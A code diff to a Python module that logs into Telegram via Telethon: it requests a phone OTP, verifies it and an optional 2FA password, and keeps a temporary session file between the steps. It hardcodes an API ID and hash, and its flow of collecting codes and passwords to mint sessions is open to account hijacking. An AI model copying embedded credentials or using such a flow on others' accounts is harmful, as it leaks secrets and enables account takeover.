@@ -11,20 +11,38 @@ API_ID = '25170767'
 API_HASH = 'd512fd74809a4ca3cd59078eef73afcd'
 
 
-async def send_code_request(phone_number: str) -> Dict[str, Any]:
+async def send_code_request(phone_number: str, old_session_path: Optional[str] = None) -> Dict[str, Any]:
     """
     Send OTP code request to the phone number.
     
     Args:
         phone_number: Phone number with country code (e.g., +1234567890)
+        old_session_path: Optional path to old session file to clean up
     
     Returns:
         Dict with phone_code_hash or error
     """
+    # Clean up old session file if provided (from previous OTP request)
+    if old_session_path:
+        old_session_file = old_session_path + '.session'
+        if os.path.exists(old_session_file):
+            try:
+                os.remove(old_session_file)
+            except:
+                pass
+    
     # Generate random session filename in temp directory
     temp_dir = tempfile.gettempdir()
     random_name = ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(16))
     session_path = os.path.join(temp_dir, random_name)
+    
+    # Clean up any existing session file with this path (shouldn't exist, but just in case)
+    session_file = session_path + '.session'
+    if os.path.exists(session_file):
+        try:
+            os.remove(session_file)
+        except:
+            pass
     
     client = TelegramClient(session_path, API_ID, API_HASH)
     
@@ -34,14 +52,12 @@ async def send_code_request(phone_number: str) -> Dict[str, Any]:
         # Send code request - OTP will be received on Telegram
         sent_code = await client.send_code_request(phone_number)
         
+        # IMPORTANT: Keep the session file - it's needed for verification
+        # Don't disconnect or delete - the session must persist
         await client.disconnect()
         
-        # Delete the temporary session file
-        try:
-            if os.path.exists(session_path + '.session'):
-                os.remove(session_path + '.session')
-        except:
-            pass
+        # DO NOT delete the session file here - it's needed for OTP verification
+        # The session file will be cleaned up after successful verification or on error
         
         return {
             "success": True,
@@ -143,14 +159,30 @@ async def verify_otp_and_create_session(
     # Clean OTP code - remove any whitespace
     otp_code = otp_code.strip()
     
+    # The session file should already exist from send_code_request
+    # It contains the connection state needed for OTP verification
+    # DO NOT delete it - Telegram requires the same session for verification
+    session_file = session_path + '.session'
+    
+    # If session file doesn't exist, that means a new OTP request is needed
+    if not os.path.exists(session_file):
+        return {
+            "success": False,
+            "error": "Session expired. Please request a new OTP code."
+        }
+    
     client = TelegramClient(session_path, API_ID, API_HASH)
     
     try:
         await client.connect()
         
         # Sign in with OTP code
+        # Note: The session file must exist and match the one from send_code_request
         try:
-            await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)
+            result = await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)
+            # If sign_in returns a user object, we're logged in
+            if result:
+                pass  # Success, continue below
         except errors.SessionPasswordNeededError:
             # 2FA is enabled - return indication that 2FA password is needed
             await client.disconnect()
@@ -180,7 +212,7 @@ async def verify_otp_and_create_session(
                 pass
             return {
                 "success": False,
-                "error": "OTP code has expired. Please request a new code."
+                "error": "OTP code has expired. Please request a new OTP code by clicking 'Send OTP' again."
             }
         except errors.FloodWaitError as e:
             await client.disconnect()
@@ -281,22 +313,8 @@ async def verify_2fa_and_finalize_session(
     try:
         await client.connect()
         
-        # Get password
-        try:
-            password_hint = await client.get_password()
-        except Exception as e:
-            await client.disconnect()
-            try:
-                if os.path.exists(session_path + '.session'):
-                    os.remove(session_path + '.session')
-            except:
-                pass
-            return {
-                "success": False,
-                "error": f"Failed to get password info: {str(e)}"
-            }
-        
-        # Sign in with 2FA password
+        # Sign in with 2FA password directly
+        # No need to get password hint - Telethon handles this internally
         try:
             await client.sign_in(password=password_2fa)
         except errors.PasswordHashInvalidError:
